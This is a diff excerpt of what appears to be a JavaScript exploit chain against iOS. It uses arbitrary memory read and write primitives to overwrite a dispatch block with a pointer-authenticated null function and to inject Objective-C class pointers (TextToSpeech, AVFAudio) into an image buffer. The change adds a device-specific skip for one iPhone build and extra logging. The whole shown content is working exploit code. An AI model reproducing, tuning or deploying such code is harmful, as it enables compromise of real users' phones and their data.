@@ -18939,10 +18939,18 @@ async function main() {
             print(`dispatchBlock: ${dispatchBlock.hex()}`);
             p.write64(dispatchBlock + 0x20n, paciza_nullfunc);
           }
-          const classes = [offsets.TextToSpeech__OBJC_CLASS__TtC12TextToSpeech27TTSMagicFirstPartyAudioUnit, offsets.AVFAudio__OBJC_CLASS__AVSpeechSynthesisMarker];
-          for (let i = 0; i < 2; ++i) {
+          const preloadClasses = [
+            ["TTSMagicFirstPartyAudioUnit", offsets.TextToSpeech__OBJC_CLASS__TtC12TextToSpeech27TTSMagicFirstPartyAudioUnit],
+            ["AVSpeechSynthesisMarker", offsets.AVFAudio__OBJC_CLASS__AVSpeechSynthesisMarker]
+          ];
+          for (let i = 0; i < preloadClasses.length; ++i) {
+            const [className, cls] = preloadClasses[i];
+            if (p.device_model === "iPhone15,3_22D60" && i === 1) {
+              print(`preload class[${i}] ${className} skipped for ${p.device_model} cls=${cls.hex()}`);
+              continue;
+            }
             const worker = dlopen_workers[i];
-            print(`preload class[${i}]=${classes[i].hex()} worker=${worker.id.hex()}`);
+            print(`preload class[${i}] ${className}=${cls.hex()} worker=${worker.id.hex()}`);
             sleep(10);
             const wrappedBitmap = p.read64(worker.bitmap + 0x18n);
             print(`wrappedBitmap: ${wrappedBitmap.hex()}`);
@@ -18952,10 +18960,11 @@ async function main() {
             sleep(10);
             print(`preload class write begin i=${i} addr=${(imageBuffer + 0x20n).hex()}`);
             sleep(10);
-            p.write64(imageBuffer + 0x20n, classes[i]);
+            p.write64(imageBuffer + 0x20n, cls);
             print(`preload class write done i=${i}`);
             sleep(10);
           }
+          print("preload classes complete");
           const providerRequestClass = offsets.AVFAudio__OBJC_CLASS__AVSpeechSynthesisProviderRequest;
           print(`Load TextToSpeech target=${valueHex(providerRequestClass)}`);
           await loadObjcClass(providerRequestClass);
